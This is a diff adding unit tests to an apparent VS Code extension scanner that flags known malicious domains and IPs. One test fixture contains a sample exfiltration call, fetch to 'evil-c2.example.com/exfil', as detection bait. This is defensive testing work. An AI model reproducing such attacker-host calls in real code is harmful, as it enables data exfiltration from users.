@@ -1,4 +1,5 @@
 import { describe, expect, it } from "vitest";
+import { performance } from "node:perf_hooks";
 import type { VsixContents, VsixManifest, ZooData } from "../types.js";
 import {
   checkDomains,
@@ -136,6 +137,30 @@ describe("checkDomains", () => {
     const findings = checkDomains(contents, knownDomains);
     expect(findings).toHaveLength(0);
   });
+
+  it("short-circuits domain scanning when no known domains are configured", () => {
+    const contents = makeContents({
+      "large.js": "A".repeat(100_000),
+    });
+
+    const start = performance.now();
+    const findings = checkDomains(contents, new Set());
+
+    expect(findings).toHaveLength(0);
+    expect(performance.now() - start).toBeLessThan(100);
+  });
+
+  it("handles long encoded tokens while still finding known domains", () => {
+    const contents = makeContents({
+      "large.js": `${"A".repeat(100_000)}\nfetch("https://evil-c2.example.com/exfil")`,
+    });
+    const knownDomains = new Set(["evil-c2.example.com"]);
+
+    const findings = checkDomains(contents, knownDomains);
+
+    expect(findings).toHaveLength(1);
+    expect(findings[0]?.metadata?.["domain"]).toBe("evil-c2.example.com");
+  });
 });
 
 describe("checkIps", () => {
@@ -169,6 +194,16 @@ describe("checkIps", () => {
     const knownIps = new Set(["185.234.123.45"]);
 
     const findings = checkIps(contents, knownIps);
+    expect(findings).toHaveLength(0);
+  });
+
+  it("short-circuits IP scanning when no known IPs are configured", () => {
+    const contents = makeContents({
+      "large.js": "8.8.8.8 ".repeat(10_000),
+    });
+
+    const findings = checkIps(contents, new Set());
+
     expect(findings).toHaveLength(0);
   });
 });
